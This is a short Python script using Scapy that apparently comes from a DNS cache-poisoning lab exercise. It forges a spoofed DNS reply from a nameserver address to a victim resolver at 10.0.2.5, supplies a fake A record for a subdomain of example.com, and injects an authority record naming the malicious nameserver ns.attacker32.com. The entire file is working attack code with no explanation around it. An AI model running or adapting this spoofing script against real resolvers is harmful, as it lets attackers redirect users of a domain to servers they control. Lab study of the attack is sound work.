#!/usr/bin/python3
from scapy.all import *
domain = 'example.com'# The target domain we're attacking 
ns = 'ns.attacker32.com'# Our malicious nameserver
# exp="twysw.example.com"
name = 'twysw.example.com'
ip = IP(dst="10.0.2.5", src="199.43.135.53")
udp = UDP(dport=33333, sport=53)
Qdsec = DNSQR(qname=name)#dns_query
# DNS Answer Section (fake IP for the subdomain)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
# DNS Authority Section (injects our malicious nameserver)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)

# Construct the full DNS response
dns = DNS(
    id=0xAAAA,  # Should match the victim's query ID
    aa=1,       # Authoritative answer flag
    rd=1, qr=1, # Response flags
    qdcount=1, ancount=1, nscount=1,
    qd=Qdsec, an=Anssec, ns=NSsec
)
reply = ip/udp/dns
"""with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(reply))"""
send(reply)
